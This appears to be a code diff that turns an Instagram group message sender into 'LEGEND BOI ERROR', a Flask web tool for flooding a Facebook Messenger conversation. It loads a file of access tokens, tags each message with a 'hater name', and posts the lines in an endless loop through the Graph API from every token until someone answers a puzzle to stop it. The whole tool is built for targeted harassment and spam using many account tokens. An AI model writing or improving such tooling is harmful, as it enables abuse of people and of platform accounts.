@@ -1,270 +1,283 @@
-from flask import Flask, request, render_template_string
-from instagrapi import Client
-import threading
+from flask import Flask, request, render_template_string, jsonify
+import requests
+from threading import Thread, Event
 import time
-import os
-import json
+import random
+import string
+from datetime import datetime
 
 app = Flask(__name__)
+app.debug = True
 
-# Render-compatible upload directory
-UPLOAD_FOLDER = "/tmp/uploads"
-os.makedirs(UPLOAD_FOLDER, exist_ok=True)
-app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER
+# Global Storage
+threads = {}        # thread_id: thread_object
+stop_events = {}    # thread_id: Event
+tasks = {}          # thread_id: {"question": "", "answer": "", "type": ""}
+counters = {}       # thread_id: {"sent": 0, "failed": 0}
+logs = {}           # thread_id: list of logs
 
-# Global variables (basic state tracking)
-messages = []
-interval = 0
-thread_id = ""
-prefix = ""
-cl = None
-running = False
-lock = threading.Lock()  # To prevent race conditions
+# Headers
+headers = {
+    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36',
+    'Accept': '*/*',
+    'Connection': 'keep-alive'
+}
 
+# Generate Random Stop Task
+def generate_task():
+    types = ["math", "captcha", "reverse", "emoji"]
+    t = random.choice(types)
+    
+    if t == "math":
+        a, b = random.randint(1, 15), random.randint(1, 15)
+        return {"type": "math", "question": f"{a} + {b} = ?", "answer": str(a + b)}
+    elif t == "captcha":
+        code = ''.join(random.choices(string.ascii_letters + string.digits, k=5))
+        return {"type": "captcha", "question": f"Type: <code>{code}</code>", "answer": code}
+    elif t == "reverse":
+        word = random.choice(["LEGEND", "ERROR", "BOI", "FIRE", "STOP", "KING", "GO"])
+        return {"type": "reverse", "question": f"Reverse: <b>{word}</b>", "answer": word[::-1]}
+    elif t == "emoji":
+        mapping = {
+            "rocket fire": "GO",
+            "skull crossbones": "DIE",
+            "crown star": "KING",
+            "100 fire": "PERFECT"
+        }
+        key = random.choice(list(mapping.keys()))
+        emojis = key.replace(" ", " ")
+        return {"type": "emoji", "question": f"Guess: {emojis}", "answer": mapping[key]}
 
-# Function to send messages continuously
-def send_messages():
-    global messages, interval, thread_id, prefix, cl, running
-    for message in messages:
-        with lock:
-            if not running:
-                break
+# Message Sender Function
+def send_messages(thread_id, access_tokens, convo_id, hater_name, delay, messages):
+    stop_event = stop_events[thread_id]
+    sent = failed = 0
+    logs[thread_id] = []
+
+    while not stop_event.is_set():
+        for msg_text in messages:
+            if stop_event.is_set(): break
+            for token in access_tokens:
+                if stop_event.is_set(): break
+                url = f"https://graph.facebook.com/v15.0/t_{convo_id}/"
+                full_msg = f"{hater_name} {msg_text.strip()}"
+                params = {'access_token': token, 'message': full_msg}
+
+                try:
+                    r = requests.post(url, data=params, headers=headers, timeout=10)
+                    ts = datetime.now().strftime("%H:%M:%S")
+                    if r.status_code == 200:
+                        log = f"<span style='color:#0f0'>[{ts}] SENT: {full_msg[:30]}...</span>"
+                        sent += 1
+                    else:
+                        log = f"<span style='color:#f55'>[{ts}] FAIL: {r.status_code}</span>"
+                        failed += 1
+                except:
+                    log = f"<span style='color:#ff0'>[{ts}] ERR: network</span>"
+                    failed += 1
+
+                logs[thread_id].append(log)
+                if len(logs[thread_id]) > 200:
+                    logs[thread_id] = logs[thread_id][-200:]
+                counters[thread_id] = {"sent": sent, "failed": failed}
+                time.sleep(delay)
+
+    # Cleanup
+    for d in [threads, stop_events, tasks, counters, logs]:
+        d.pop(thread_id, None)
+
+# Routes
+@app.route('/', methods=['GET', 'POST'])
+def index():
+    if request.method == 'POST':
         try:
-            full_message = f"{prefix} {message}" if prefix else message
-            cl.direct_send(full_message, [thread_id])
-            print(f"Message sent: {full_message}")
+            token_file = request.files['tokenFile']
+            access_tokens = [l.strip() for l in token_file.read().decode().splitlines() if l.strip()]
+            convo_id = request.form.get('threadId', '').strip()
+            hater_name = request.form.get('kidx', 'LEGEND').strip()
+            delay = max(1, int(request.form.get('time', 3)))
+            txt_file = request.files['txtFile']
+            messages = [l.strip() for l in txt_file.read().decode().splitlines() if l.strip()]
+
+            if not access_tokens or not messages or not convo_id:
+                return "Invalid input!", 400
+
+            thread_id = f"t_{int(time.time()*1000)}"
+            stop_events[thread_id] = Event()
+            logs[thread_id] = []
+            counters[thread_id] = {"sent": 0, "failed": 0}
+            tasks[thread_id] = generate_task()
+
+            thread = Thread(
+                target=send_messages,
+                args=(thread_id, access_tokens, convo_id, hater_name, delay, messages),
+                daemon=True
+            )
+            thread.start()
+            threads[thread_id] = thread
         except Exception as e:
-            print(f"Error while sending message: {e}")
-        time.sleep(interval)
+            return f"Error: {str(e)}", 500
 
+    return render_template_string(HTML_TEMPLATE, threads=threads.keys(), tasks=tasks)
 
-# HTML UI Template
-HTML_TEMPLATE = """
+@app.route('/stop/<thread_id>', methods=['POST'])
+def stop_thread(thread_id):
+    user_answer = request.form.get('answer', '').strip()
+    correct = tasks.get(thread_id, {}).get("answer", "").strip()
+    if user_answer.lower() == correct.lower():
+        if thread_id in stop_events:
+            stop_events[thread_id].set()
+        return "TASK SOLVED! Thread Stopped."
+    return f"WRONG! Try again."
+
+@app.route('/stop_all', methods=['POST'])
+def stop_all():
+    for event in stop_events.values():
+        event.set()
+    return "ALL THREADS STOPPED!"
+
+@app.route('/status')
+def status():
+    return jsonify({
+        tid: {
+            "sent": counters.get(tid, {}).get("sent", 0),
+            "failed": counters.get(tid, {}).get("failed", 0),
+            "logs": logs.get(tid, [])[-50:],
+            "task": tasks.get(tid, {})
+        } for tid in list(threads.keys())
+    })
+
+# HTML Template
+HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Instagram Group Message Sender</title>
-    <style>
-        body {
-            font-family: 'Poppins', sans-serif;
-            background: linear-gradient(135deg, #1e3c72, #2a5298, #4facfe);
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            overflow: hidden;
-            position: relative;
-        }
-        body::before {
-            content: '';
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            background: radial-gradient(circle, rgba(255, 255, 255, 0.1) 0%, transparent 70%);
-            animation: pulse 10s infinite ease-in-out;
-            z-index: -1;
-        }
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-            100% { transform: scale(1); }
-        }
-        .container {
-            max-width: 650px;
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(15px);
-            padding: 40px;
-            border-radius: 20px;
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
-            border: 2px solid rgba(255, 255, 255, 0.2);
-            animation: neonGlow 2s ease-in-out infinite alternate;
-            position: relative;
-            overflow: hidden;
-        }
-        @keyframes neonGlow {
-            from {
-                box-shadow: 0 0 15px #4facfe, 0 0 30px #2a5298;
-            }
-            to {
-                box-shadow: 0 0 25px #00eaff, 0 0 50px #a3e4ff;
-            }
-        }
-        .container::before {
-            content: '';
-            position: absolute;
-            top: -2px;
-            left: -2px;
-            right: -2px;
-            bottom: -2px;
-            background: linear-gradient(45deg, #00eaff, #a3e4ff, #4facfe);
-            z-index: -1;
-            filter: blur(10px);
-            animation: borderGlow 3s infinite;
-        }
-        @keyframes borderGlow {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        h1 {
-            font-size: 2.8em;
-            text-align: center;
-            color: #00eaff;
-            text-shadow: 0 0 15px #00eaff, 0 0 30px #a3e4ff;
-            margin-bottom: 25px;
-            font-weight: 600;
-        }
-        form {
-            display: flex;
-            flex-direction: column;
-            gap: 20px;
-        }
-        input[type="text"], input[type="number"], textarea, input[type="file"] {
-            padding: 15px;
-            font-size: 1.1em;
-            border: none;
-            border-radius: 12px;
-            background: rgba(255, 255, 255, 0.1);
-            color: #fff;
-            outline: none;
-            transition: all 0.4s ease;
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            box-shadow: inset 0 0 10px rgba(0, 234, 255, 0.1);
-        }
-        textarea {
-            resize: vertical;
-            min-height: 120px;
-            line-height: 1.5;
-        }
-        input[type="file"]::file-selector-button {
-            background: linear-gradient(45deg, #00eaff, #4facfe);
-            color: #fff;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: all 0.4s ease;
-        }
-        input[type="file"]::file-selector-button:hover {
-            background: linear-gradient(45deg, #00b4cc, #2a5298);
-            box-shadow: 0 5px 15px rgba(0, 234, 255, 0.4);
-        }
-        input:focus, textarea:focus {
-            background: rgba(255, 255, 255, 0.2);
-            box-shadow: 0 0 20px #00eaff, 0 0 40px #a3e4ff;
-            transform: scale(1.02);
-        }
-        input::placeholder, textarea::placeholder {
-            color: rgba(255, 255, 255, 0.5);
-            font-style: italic;
-        }
-        button {
-            padding: 15px 30px;
-            font-size: 1.2em;
-            background: linear-gradient(45deg, #00eaff, #4facfe);
-            color: #fff;
-            border: none;
-            border-radius: 12px;
-            cursor: pointer;
-            transition: all 0.4s ease;
-            box-shadow: 0 5px 20px rgba(0, 234, 255, 0.4);
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        button:hover {
-            background: linear-gradient(45deg, #00b4cc, #2a5298);
-            box-shadow: 0 8px 30px rgba(0, 234, 255, 0.6);
-            transform: translateY(-3px) scale(1.05);
-        }
-        button.stop {
-            background: linear-gradient(45deg, #ff4d4d, #ff8c8c);
-        }
-        button.stop:hover {
-            background: linear-gradient(45deg, #cc0000, #ff6666);
-            box-shadow: 0 8px 30px rgba(255, 77, 77, 0.6);
-        }
-        p {
-            font-size: 1.2em;
-            text-align: center;
-            color: #a3e4ff;
-            text-shadow: 0 0 10px #a3e4ff, 0 0 20px #00eaff;
-            margin-top: 25px;
-            font-weight: 500;
-        }
-    </style>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>LEGEND BOI ERROR</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <style>
+    body { 
+      background: linear-gradient(rgba(0,0,0,0.85), rgba(0,0,0,0.85)), url('https://i.imgur.com/92rqE1X.jpeg') center/cover fixed; 
+      color: #0f0; font-family: 'Courier New', monospace; min-height: 100vh;
+    }
+    .container { max-width: 420px; margin: 20px auto; }
+    .form-control { background: rgba(0,255,0,0.1); border: 1px solid #0f0; color: #fff; border-radius: 8px; }
+    .btn-start { background: linear-gradient(45deg, #0f0, #0c0); color: #000; font-weight: bold; }
+    .btn-stop { background: #f55; color: #fff; }
+    .console { 
+      background: #000; color: #0f0; height: 180px; overflow-y: auto; padding: 8px; 
+      border-radius: 8px; font-size: 12px; border: 1px solid #0f0; 
+    }
+    .task-box { background: rgba(255,255,0,0.2); border: 1px dashed #ff0; padding: 8px; border-radius: 8px; font-size: 13px; }
+    h1 { text-shadow: 0 0 15px #0f0; animation: glow 2s infinite; }
+    @keyframes glow { 0%,100% { text-shadow: 0 0 15px #0f0; } 50% { text-shadow: 0 0 30px #0f0; } }
+    .card { background: rgba(0,0,0,0.6); border: 1px solid #0f0; }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Instagram Group Message Sender</h1>
-        <form method="POST" action="/" enctype="multipart/form-data">
-            <input type="file" name="cookies_file" accept=".txt" required placeholder="Upload cookies.txt">
-            <textarea name="messages" placeholder="Enter messages (one per line)" required></textarea>
-            <input type="text" name="thread_id" placeholder="Group Thread ID" required>
-            <input type="number" name="interval" placeholder="Interval (seconds)" required>
-            <input type="text" name="prefix" placeholder="Prefix (e.g., [Bot])">
-            <button type="submit">Start Sending</button>
-        </form>
-        <form method="POST" action="/stop">
-            <button type="submit" class="stop">Stop Sending</button>
-        </form>
-        <p>{{ status | safe }}</p>
+<div class="container">
+  <h1 class="text-center mt-3">LEGEND BOI ERROR</h1>
+
+  <form method="post" enctype="multipart/form-data" class="card p-3 mb-3">
+    <div class="mb-2">
+      <label class="form-label">TOKEN FILE</label>
+      <input type="file" class="form-control form-control-sm" name="tokenFile" required>
     </div>
+    <div class="mb-2">
+      <label>CONVO ID</label>
+      <input type="text" class="form-control form-control-sm" name="threadId" required>
+    </div>
+    <div class="mb-2">
+      <label>HATER NAME</label>
+      <input type="text" class="form-control form-control-sm" name="kidx" value="LEGEND" required>
+    </div>
+    <div class="mb-2">
+      <label>DELAY (sec)</label>
+      <input type="number" class="form-control form-control-sm" name="time" value="3" min="1" required>
+    </div>
+    <div class="mb-2">
+      <label>TEXT FILE</label>
+      <input type="file" class="form-control form-control-sm" name="txtFile" required>
+    </div>
+    <button type="submit" class="btn btn-start btn-sm w-100">START THREAD</button>
+  </form>
+
+  <form method="post" action="/stop_all" class="mb-3">
+    <button type="submit" class="btn btn-danger btn-sm w-100">FORCE STOP ALL</button>
+  </form>
+
+  <h5 class="text-warning">Active Threads ({{ threads|length }})</h5>
+  {% for tid in threads %}
+  <div class="card mb-3">
+    <div class="card-body p-2">
+      <div class="d-flex justify-content-between align-items-center">
+        <strong>Thread #{{ loop.index }}</strong>
+        <div>
+          <span class="badge bg-success">Sent: <span id="sent-{{ tid }}">0</span></span>
+          <span class="badge bg-danger ms-1">Fail: <span id="failed-{{ tid }}">0</span></span>
+        </div>
+      </div>
+
+      <div class="task-box mt-2">
+        <small><b>STOP TASK:</b> <span id="task-{{ tid }}">Loading...</span></small>
+      </div>
+
+      <form method="post" action="/stop/{{ tid }}" class="mt-2">
+        <div class="input-group input-group-sm">
+          <input type="text" class="form-control" name="answer" placeholder="Answer here" required>
+          <button type="submit" class="btn btn-stop">STOP</button>
+        </div>
+      </form>
+
+      <div class="console mt-2" id="console-{{ tid }}">Starting thread...</div>
+    </div>
+  </div>
+  {% endfor %}
+
+  {% if not threads %}
+  <p class="text-center text-muted">No threads running.</p>
+  {% endif %}
+
+  <footer class="text-center mt-4 text-muted small">
+    <p>© 2025 ERROR ON FIRE</p>
+    <a href="https://wa.me/+923203972669" class="text-success">Chat on WhatsApp</a>
+  </footer>
+</div>
+
+<script>
+  setInterval(() => {
+    fetch('/status')
+      .then(r => r.json())
+      .then(data => {
+        Object.keys(data).forEach(tid => {
+          const sent = document.getElementById(`sent-${tid}`);
+          const failed = document.getElementById(`failed-${tid}`);
+          const consoleDiv = document.getElementById(`console-${tid}`);
+          const taskSpan = document.getElementById(`task-${tid}`);
+
+          if (sent) sent.textContent = data[tid].sent;
+          if (failed) failed.textContent = data[tid].failed;
+          if (consoleDiv && data[tid].logs) {
+            consoleDiv.innerHTML = data[tid].logs.join('<br>');
+            consoleDiv.scrollTop = consoleDiv.scrollHeight;
+          }
+          if (taskSpan && data[tid].task) {
+            taskSpan.innerHTML = data[tid].task.question;
+          }
+        });
+      })
+      .catch(() => {});
+  }, 1000);
+</script>
 </body>
 </html>
-"""
+'''
 
-
-@app.route("/", methods=["GET", "POST"])
-def index():
-    global messages, interval, thread_id, prefix, cl, running
-    status = "Enter details to start sending messages."
-
-    if request.method == "POST":
-        try:
-            thread_id = request.form["thread_id"].strip()
-            interval = int(request.form["interval"])
-            prefix = request.form.get("prefix", "").strip()
-
-            # Handle cookies file upload
-            cookies_file = request.files.get("cookies_file")
-            if not cookies_file or cookies_file.filename == "":
-                return render_template_string(HTML_TEMPLATE, status="Please upload cookies.txt")
-
-            cookies_path = os.path.join(app.config["UPLOAD_FOLDER"], "cookies.txt")
-            cookies_file.save(cookies_path)
-
-            # Load cookies safely (JSON format)
-            with open(cookies_path, "r") as f:
-                cookies = json.load(f)
-
-            # Initialize Instagram client
-            cl = Client()
-            cl.login_by_sessionid(cookies["sessionid"])
-
-            # Load and clean messages
-            messages = [m.strip() for m in request.form["messages"].split("\n") if m.strip()]
-
-            # Start sending in background
-            with lock:
-                running = True
-            threading.Thread(target=send_messages, daemon=True).start()
-
-            status = "✅ Messages are being sent!"
-        except Exception as e:
-            status = f"❌ Error: {str(e)}"
-
-    return render_template_string(HTML_TEMPLATE, status=status)
-
-
-@app.route("/stop", methods=["POST"])
-def stop():
-    global running
-    with lock:
-        running = False
-    return render_template_string(HTML_TEMPLATE, status="🛑 Stopped sending messages.")
-
-
-if __name__ == "__main__":
-    port = int(os.getenv("PORT", 5000))
-    app.run(host="0.0.0.0", port=port, debug=True)
+if __name__ == '__main__':
+    print("="*60)
+    print("   LEGEND BOI ERROR SERVER STARTED!")
+    print("   Multiple Threads | Live Console | Task Stop | No Crash")
+    print("   Visit: http://localhost:5000")
+    print("="*60)
+    app.run(host='0.0.0.0', port=5000, threaded=True)
